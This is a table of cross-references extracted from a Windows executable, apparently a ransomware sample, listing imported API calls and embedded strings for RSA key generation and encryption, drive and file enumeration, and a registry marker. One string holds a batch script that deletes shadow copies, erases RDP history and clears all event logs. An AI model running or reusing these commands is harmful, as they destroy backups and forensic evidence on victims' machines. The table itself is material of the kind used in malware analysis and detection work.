reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x403e7b	0x403eac	string	0x403e0d	][_^Y
0x403e95	0x403eac	string	0x403e0d	][_^Y
0x404010	0x404046	string	0x403fdd	^][_
0x40438b	0x4043bf	string	0x40434a	^_][Y
0x404475	0x401034	import	0x404450	KERNEL32.dll.lstrlenA
0x40460d	0x40474a	string	0x4045c6	X_][
0x404792	0x4047d3	string	0x404754	_^][
0x4047a1	0x4047d3	string	0x404754	_^][
0x4047a5	0x4047d3	string	0x404754	_^][
0x40487e	0x4048f7	string	0x404835	_^][Y
0x40499c	0x4049a5	string	0x4048ff	_^[Y
0x404bf5	0x404c0a	string	0x404bc9	;]\ft
0x404f5f	0x404f75	string	0x404efa	9|$\t
0x404f91	0x40532b	string	0x404efa	^[_]
0x40632e	0x406345	string	0x4062f5	^]_[
0x406cf2	0x406cfc	string	0x406cde	UVWh
0x406deb	0x406db5	string	0x406cde	3ҍL$ blocks=Basic Latin,Cyrillic
0x406e05	0x406d9b	string	0x406cde	3\r|$
0x406fda	0x406ff4	string	0x406f4f	j\bY3\r|$
0x407195	0x401018	import	0x40717c	ADVAPI32.dll.CryptAcquireContextW
0x4071af	0x401010	import	0x40717c	ADVAPI32.dll.CryptGenRandom
0x4071bd	0x401014	import	0x40717c	ADVAPI32.dll.CryptReleaseContext
0x4071c6	0x4071d2	string	0x40717c	^_[]
0x4071c8	0x401014	import	0x40717c	ADVAPI32.dll.CryptReleaseContext
0x4071ec	0x401cb0	string	0x40717c	SHA224
0x40720c	0x401cb8	string	0x40717c	SHA256
0x4076da	0x401fbc	string	0x407611	%d.%d
0x407761	0x407752	string	0x407611	]_^[
0x40840c	0x408464	string	0x40835b	[_^]
0x40844d	0x408464	string	0x40835b	[_^]
0x40845d	0x408464	string	0x40835b	[_^]
0x408700	0x408760	string	0x40861e	9\$,u\rUUW
0x40876e	0x40882d	string	0x40861e	^]_[
0x4087a3	0x40882d	string	0x40861e	^]_[
0x408826	0x40882d	string	0x40861e	^]_[
0x4088dc	0x408a8b	string	0x40886c	^_][
0x408966	0x408a8b	string	0x40886c	^_][
0x408a6b	0x408a8b	string	0x40886c	^_][
0x408a7d	0x408a8b	string	0x40886c	^_][
0x408a84	0x408a8b	string	0x40886c	^_][
0x408ca7	0x408d58	string	0x408c85	_^][
0x408cba	0x408d58	string	0x408c85	_^][
0x408cd0	0x408d58	string	0x408c85	_^][
0x408cde	0x408d58	string	0x408c85	_^][
0x408d03	0x408d58	string	0x408c85	_^][
0x408d18	0x408d58	string	0x408c85	_^][
0x408d3f	0x408d58	string	0x408c85	_^][
0x408d51	0x408d58	string	0x408c85	_^][
0x409294	0x401048	import	0x409277	KERNEL32.dll.SetFilePointerEx
0x40929e	0x401038	import	0x409277	KERNEL32.dll.GetLastError
0x4092f3	0x402110	string	0x4092bb	{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
0x4092fc	0x401110	import	0x4092bb	USER32.dll.wsprintfA
0x409309	0x401034	import	0x4092bb	KERNEL32.dll.lstrlenA
0x409327	0x4099ce	string	0x409313	UVW3
0x409356	0x4010ec	import	0x409313	RPCRT4.dll.UuidCreate
0x40938b	0x40104c	import	0x409313	KERNEL32.dll.CreateFileW
0x409391	0x401040	import	0x409313	KERNEL32.dll.WriteFile
0x4093a8	0x40103c	import	0x409313	KERNEL32.dll.GetFileSizeEx
0x4093cc	0x401034	import	0x409313	KERNEL32.dll.lstrlenA
0x409455	0x401034	import	0x409313	KERNEL32.dll.lstrlenA
0x4095a1	0x401044	import	0x409313	KERNEL32.dll.ReadFile
0x409628	0x401044	import	0x409313	KERNEL32.dll.ReadFile
0x409735	0x401034	import	0x409313	KERNEL32.dll.lstrlenA
0x409747	0x4010d8	import	0x409313	KERNEL32.dll.CloseHandle
0x4097e4	0x401034	import	0x409783	KERNEL32.dll.lstrlenA
0x4097ef	0x401034	import	0x409783	KERNEL32.dll.lstrlenA
0x4097fd	0x401034	import	0x409783	KERNEL32.dll.lstrlenA
0x40980e	0x401034	import	0x409783	KERNEL32.dll.lstrlenA
0x409817	0x4010e0	import	0x409783	KERNEL32.dll.lstrcmpiA
0x4098f0	0x40108c	import	0x4098bb	KERNEL32.dll.CreateProcessW
0x40990f	0x4010b4	import	0x4098fd	KERNEL32.dll.MultiByteToWideChar
0x409933	0x4010b4	import	0x4098fd	KERNEL32.dll.MultiByteToWideChar
0x409960	0x401098	import	0x409940	KERNEL32.dll.GetTempFileNameW
0x409966	0x402548	string	0x409940	.bat
0x409972	0x401084	import	0x409940	KERNEL32.dll.lstrcatW
0x40998e	0x40104c	import	0x409940	KERNEL32.dll.CreateFileW
0x40999f	0x402380	string	0x409940	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x4099a6	0x401034	import	0x409940	KERNEL32.dll.lstrlenA
0x4099af	0x401040	import	0x409940	KERNEL32.dll.WriteFile
0x4099b6	0x4010d8	import	0x409940	KERNEL32.dll.CloseHandle
0x4099e2	0x4010b8	import	0x4099ce	KERNEL32.dll.WideCharToMultiByte
0x409a02	0x4010b8	import	0x4099ce	KERNEL32.dll.WideCharToMultiByte
0x409a49	0x401088	import	0x409a10	KERNEL32.dll.GetModuleFileNameW
0x409a5f	0x402554	string	0x409a10	COMSPEC
0x409a64	0x401090	import	0x409a10	KERNEL32.dll.GetEnvironmentVariableW
0x409a72	0x401084	import	0x409a10	KERNEL32.dll.lstrcatW
0x409a7e	0x402564	string	0x409a10	/c del
0x409a96	0x402574	string	0x409a10	> nul
0x409ac7	0x402584	string	0x409a10	Open
0x409ad7	0x4010f8	import	0x409a10	SHELL32.dll.ShellExecuteExW
0x409ae5	0x4010b0	import	0x409a10	KERNEL32.dll.SetPriorityClass
0x409af3	0x401050	import	0x409a10	KERNEL32.dll.GetCurrentProcess
0x409aff	0x401058	import	0x409a10	KERNEL32.dll.GetCurrentThread
0x409b06	0x40105c	import	0x409a10	KERNEL32.dll.SetThreadPriority
0x409b2a	0x4010a0	import	0x409b26	KERNEL32.dll.GetFileAttributesW
0x409b46	0x401108	import	0x409b3d	SHLWAPI.dll.PathRemoveFileSpecW
0x409b4c	0x401084	import	0x409b3d	KERNEL32.dll.lstrcatW
0x409b7f	0x40104c	import	0x409b3d	KERNEL32.dll.CreateFileW
0x409b9a	0x401034	import	0x409b3d	KERNEL32.dll.lstrlenA
0x409ba8	0x401040	import	0x409b3d	KERNEL32.dll.WriteFile
0x409baf	0x4010d8	import	0x409b3d	KERNEL32.dll.CloseHandle
0x409bda	0x40aa00	string	0x409bbc	VWj\b
0x409bf1	0x401084	import	0x409bbc	KERNEL32.dll.lstrcatW
0x409bfa	0x401078	import	0x409bbc	KERNEL32.dll.lstrcmpiW
0x409c1a	0x4010cc	import	0x409bbc	KERNEL32.dll.lstrlenW
0x409c42	0x4010a4	import	0x409bbc	KERNEL32.dll.FindFirstFileW
0x409c9b	0x4099ce	string	0x409bbc	UVW3
0x409cd5	0x40aa00	string	0x409bbc	VWj\b
0x409d1d	0x401104	import	0x409bbc	SHLWAPI.dll.PathFindFileNameW
0x409d47	0x40109c	import	0x409bbc	KERNEL32.dll.SetFileAttributesW
0x409d85	0x401080	import	0x409bbc	KERNEL32.dll.lstrcpyW
0x409dad	0x4010ac	import	0x409bbc	KERNEL32.dll.MoveFileExW
0x409dd1	0x4010a8	import	0x409bbc	KERNEL32.dll.FindNextFileW
0x409de0	0x401070	import	0x409bbc	KERNEL32.dll.FindClose
0x409e15	0x401030	import	0x409e05	KERNEL32.dll.GetProcessHeap
0x409e1c	0x4010dc	import	0x409e05	KERNEL32.dll.HeapAlloc
0x409e24	0x401064	import	0x409e05	KERNEL32.dll.GetLogicalDrives
0x409e5d	0x401094	import	0x409e05	KERNEL32.dll.GetDriveTypeA
0x409e7d	0x401030	import	0x409e05	KERNEL32.dll.GetProcessHeap
0x409e84	0x4010dc	import	0x409e05	KERNEL32.dll.HeapAlloc
0x409e95	0x4010d4	import	0x409e05	KERNEL32.dll.lstrcpyA
0x409eb0	0x4010e0	import	0x409e05	KERNEL32.dll.lstrcmpiA
0x409ef2	0x401034	import	0x409ed7	KERNEL32.dll.lstrlenA
0x409f12	0x4010e4	import	0x409ed7	KERNEL32.dll.HeapCreate
0x409f22	0x4010dc	import	0x409ed7	KERNEL32.dll.HeapAlloc
0x409f86	0x401020	import	0x409ed7	ADVAPI32.dll.RegOpenKeyExW
0x409fa6	0x402614	string	0x409ed7	CertificatesCheck
0x409fb3	0x401000	import	0x409ed7	ADVAPI32.dll.RegQueryValueExW
0x409fc5	0x401078	import	0x409ed7	KERNEL32.dll.lstrcmpiW
0x409fe1	0x401004	import	0x409ed7	ADVAPI32.dll.RegCreateKeyExW
0x409ff2	0x4010cc	import	0x409ed7	KERNEL32.dll.lstrlenW
0x40a00a	0x40101c	import	0x409ed7	ADVAPI32.dll.RegSetValueExW
0x40a014	0x401008	import	0x409ed7	ADVAPI32.dll.RegCloseKey
0x40a040	0x40104c	import	0x40a027	KERNEL32.dll.CreateFileW
0x40a04d	0x401038	import	0x40a027	KERNEL32.dll.GetLastError
0x40a056	0x401038	import	0x40a027	KERNEL32.dll.GetLastError
0x40a091	0x4010d4	import	0x40a027	KERNEL32.dll.lstrcpyA
0x40a09c	0x40106c	import	0x40a027	KERNEL32.dll.SetFilePointer
0x40a0b4	0x401040	import	0x40a027	KERNEL32.dll.WriteFile
0x40a0c9	0x4010d8	import	0x40a027	KERNEL32.dll.CloseHandle
0x40a18b	0x401088	import	0x40a138	KERNEL32.dll.GetModuleFileNameW
0x40a191	0x401090	import	0x40a138	KERNEL32.dll.GetEnvironmentVariableW
0x40a19e	0x402638	string	0x40a138	temp
0x40a1b9	0x40107c	import	0x40a138	KERNEL32.dll.lstrcpynA
0x40a206	0x409ed7	string	0x40a138	SUVW
0x40a224	0x409ed7	string	0x40a138	SUVW
0x40a242	0x409ed7	string	0x40a138	SUVW
0x40a265	0x402644	string	0x40a138	public
0x40a272	0x402654	string	0x40a138	ALLUSERSPROFILE
0x40a27f	0x401054	import	0x40a138	KERNEL32.dll.ExitProcess
0x40a290	0x401080	import	0x40a138	KERNEL32.dll.lstrcpyW
0x40a2c0	0x40100c	import	0x40a138	ADVAPI32.dll.GetCurrentHwProfileW
0x40a2da	0x401084	import	0x40a138	KERNEL32.dll.lstrcatW
0x40a32a	0x40a027	string	0x40a138	QQSW3
0x40a33b	0x401060	import	0x40a138	KERNEL32.dll.Sleep
0x40a383	0x402674	string	0x40a138	{{IDENTIFIER}}
0x40a38a	0x401100	import	0x40a138	SHLWAPI.dll.StrStrA
0x40a39b	0x401034	import	0x40a138	KERNEL32.dll.lstrlenA
0x40a3fe	0x401068	import	0x40a138	KERNEL32.dll.GetStdHandle
0x40a52e	0x401034	import	0x40a527	KERNEL32.dll.lstrlenA
0x40a5ad	0x401034	import	0x40a55c	KERNEL32.dll.lstrlenA
0x40a5d7	0x401040	import	0x40a55c	KERNEL32.dll.WriteFile
0x40a6d9	0x40268c	string	0x40a680	rsa_encrypt
0x40a6df	0x401034	import	0x40a680	KERNEL32.dll.lstrlenA
0x40a7fd	0x402698	string	0x40a7c0	rsa_genkey
0x40a803	0x401034	import	0x40a7c0	KERNEL32.dll.lstrlenA
0x40a9ee	0x40a60d	string	0x40a7c0	SUVW
0x40aa52	0x401080	import	0x40aa35	KERNEL32.dll.lstrcpyW
0x40aa7f	0x4010cc	import	0x40aa7a	KERNEL32.dll.lstrlenW
0x40aa9a	0x401080	import	0x40aa7a	KERNEL32.dll.lstrcpyW
0x40aaa6	0x4010c4	import	0x40aaa6	KERNEL32.dll.CreateToolhelp32Snapshot
0x40aaac	0x4010c0	import	0x40aaac	KERNEL32.dll.Process32FirstW
0x40aab2	0x401074	import	0x40aab2	KERNEL32.dll.Process32NextW
0x40aab8	0x4010f4	import	0x40aab8	SHELL32.dll.SHChangeNotify
0x40aabe	0x401120	import	0x40aabe	ntdll.dll._aulldiv
0x40aac4	0x40111c	import	0x40aac4	ntdll.dll._alldiv
0x40aaca	0x401118	import	0x40aaca	ntdll.dll._allrem
0x40f6fb	0x40f770	string	0x40aaca	GetFileSizeEx
0x40f768	0x40f7dc	string	0x40aaca	GetCurrentThread
0x40f772	0x40f7ba	string	0x40aaca	GetCurrentProcess
0x40f824	0x40f88a	string	0x40aaca	GetModuleFileNameW
0x40f966	0x40f9dc	string	0x40aaca	CryptReleaseContext
0x40f98f	0x40f9f2	string	0x40aaca	CryptGenRandom
0x40fabc	0x40fb26	string	0x40aaca	RPCRT4.dll
0x40fdb9	0x40fd82	string	0x40aaca	__1\re\t
